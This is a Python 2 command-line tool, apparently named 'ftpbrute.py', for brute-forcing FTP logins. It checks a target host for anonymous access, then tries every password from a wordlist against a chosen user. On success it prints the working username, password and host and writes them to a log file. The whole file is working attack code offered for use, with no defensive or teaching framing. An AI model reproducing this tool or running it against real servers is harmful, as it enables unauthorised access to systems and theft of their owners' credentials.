#!/usr/bin/python
# -*- coding: utf-8 -*-

# Import 
import sys
import time
import os
from ftplib import FTP

# OS SYSTEM
if sys.platform == 'linux-i386' or sys.platform == 'GNU/Linux' or sys.platform == 'linux' or sys.platform == 'linux-amd64' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

log = "output.log"
face = 	'''

  ______    __                      _______                         __               
 /      \  /  |                    /       \                       /  |              
/$$$$$$  |_$$ |_     ______        $$$$$$$  |  ______   __    __  _$$ |_     ______  
$$ |_ $$// $$   |   /      \       $$ |__$$ | /      \ /  |  /  |/ $$   |   /      \ 
$$   |   $$$$$$/   /$$$$$$  |      $$    $$< /$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |
$$$$/      $$ | __ $$ |  $$ |      $$$$$$$  |$$ |  $$/ $$ |  $$ |  $$ | __ $$    $$ |
$$ |       $$ |/  |$$ |__$$ |      $$ |__$$ |$$ |      $$ \__$$ |  $$ |/  |$$$$$$$$/ 
$$ |       $$  $$/ $$    $$/       $$    $$/ $$ |      $$    $$/   $$  $$/ $$       |
$$/         $$$$/  $$$$$$$/        $$$$$$$/  $$/        $$$$$$/     $$$$/   $$$$$$$/ 
                   $$ |                                                              
                   $$ |                                                              
                   $$/                                                               

'''

option = '''
Usage: ./ftpbrute.py [options]
Options: -t, --target    <hostname/ip>   |   Target to bruteforcing 
         -u, --user      <user>          |   User for bruteforcing
         -w, --wordlist  <filename>      |   Wordlist used for bruteforcing
         -h, --help      <help>          |   print this help
                                        					
Example: ./ftpbrute.py -t 192.168.1.1 -u root -w wordlist.txt

'''

file = open(log, "a")

def MyFace() :
	os.system(SysCls)
	print face
	file.write(face)


def HelpMe() :
	MyFace()
	print option
	file.write(option)
	sys.exit(1)

for arg in sys.argv:
	if arg.lower() == '-t' or arg.lower() == '--target':
            hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-u' or arg.lower() == '--user':
            user = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-h' or arg.lower() == '--help':
        	HelpMe()
	elif len(sys.argv) <= 1:
		HelpMe()
		
def checkanony() : 
	try:
		print "\n[+] Checking for anonymous login\n"
		ftp = FTP(hostname)
		ftp.login()
		ftp.retrlines('LIST')
		print "\n[!] Anonymous login successfuly !\n"
		ftp.quit()
	except Exception, e:
        	print "\n[-] Anonymous login unsuccessful...\n"
		pass
        

def BruteForce(word) :
	sys.stdout.write ("\r[?]Trying : %s " % (word))
	sys.stdout.flush()
	file.write("\n[?]Trying :"+word)
     	try:
		ftp = FTP(hostname)
		ftp.login(user, word)
		ftp.retrlines('list')
		ftp.quit()
		print "\n\t[!] Login Success ! "
		print "\t[!] Username : ",user, ""
		print "\t[!] Password : ",word, ""
		print "\t[!] Hostname : ",hostname, ""
		print "\t[!] Log all has been saved to",log,"\n"
		file.write("\n\n\t[!] Login Success ! ")
		file.write("\n\t[!] Username : "+user )
		file.write("\n\t[!] Password : "+word )
		file.write("\n\t[!] Hostname : "+hostname)
		file.write("\n\t[!] Log all has been saved to "+log)
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Aborting...\n"
		file.write("\n[-] Aborting...\n")
		sys.exit(1)
	
MyFace()
print "[!] Starting attack at %s" % time.strftime("%X")
print "[!] System Activated for brute forcing..."
print "[!] Please wait until brute forcing finish !\n"
file.write("\n[!] Starting attack at %s" % time.strftime("%X"))
file.write("\n[!] System Activated for brute forcing...")
file.write("\n[!] Please wait until brute forcing finish !\n")
checkanony()	

try:
	preventstrokes = open(wordlist, "r")
	words 	       = preventstrokes.readlines()
	count          = 0 
	while count < len(words): 
		words[count] = words[count].strip() 
		count += 1 
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
	file.write("\n[-] Error: Check your wordlist path\n")
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] Server :",hostname
print "[+] User :",user
print "[+] BruteForcing...\n"

for word in words:
	BruteForce(word.replace("\n",""))

file.close()

